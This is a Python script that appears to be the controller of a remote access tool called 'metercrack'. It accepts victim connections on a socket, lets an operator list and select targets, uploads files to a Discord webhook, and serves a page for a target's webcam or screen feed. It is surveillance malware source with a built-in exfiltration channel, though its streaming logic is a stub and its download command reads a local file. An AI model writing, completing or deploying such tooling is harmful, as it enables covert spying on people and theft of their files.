import socket
import threading
import time
from flask import Flask, render_template
import requests
import os

# Server setup
clients = []
active_target = None
flask_app = Flask(__name__)

# Command parsing
def parse_command(command):
    global active_target
    if command == "!list":
        for client in clients:
            print(f"Client IP: {client}")
    elif command.startswith("!set target"):
        ip = command.split()[2]
        active_target = ip
        print(f"Target set to: {ip}")
    elif command.startswith("!remove target"):
        ip = command.split()[2]
        if ip == active_target:
            active_target = None
        print(f"Target removed: {ip}")
    elif command.startswith("!download"):
        filename = command.split()[1]
        send_file_to_webhook(filename)

# Send file to Discord webhook
def send_file_to_webhook(filename):
    url = "YOUR_DISCORD_WEBHOOK_URL"
    with open(filename, "rb") as f:
        files = {"file": f}
        response = requests.post(url, files=files)
    if response.status_code == 200:
        print("[+] Sent!")
    else:
        print("[*] Error sending file!")

# Handle incoming client connections
def handle_client(conn, addr):
    global clients
    print(f"Client {addr} connected")
    clients.append(addr)
    try:
        while True:
            data = conn.recv(1024)
            if not data:
                break
            # Here you would implement the logic to handle screen/webcam streams.
            print(f"Data received from {addr}: {data}")
    finally:
        clients.remove(addr)
        conn.close()

# Start the Flask app to serve the webcam/screen feed
@flask_app.route("/stream")
def stream():
    return render_template("stream.html", target_ip=active_target, start_time=time.ctime(), status="Playing")

# Start a socket server to listen for client connections
def start_socket_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", 9999))
    server.listen(5)
    print("Server listening on port 9999...")
    while True:
        conn, addr = server.accept()
        client_thread = threading.Thread(target=handle_client, args=(conn, addr))
        client_thread.start()

# Main function
def main():
    while True:
        command = input("metercrack > ")
        parse_command(command)

if __name__ == "__main__":
    socket_thread = threading.Thread(target=start_socket_server)
    socket_thread.start()

    flask_thread = threading.Thread(target=flask_app.run, kwargs={"host": "0.0.0.0", "port": 5000})
    flask_thread.start()

    main()
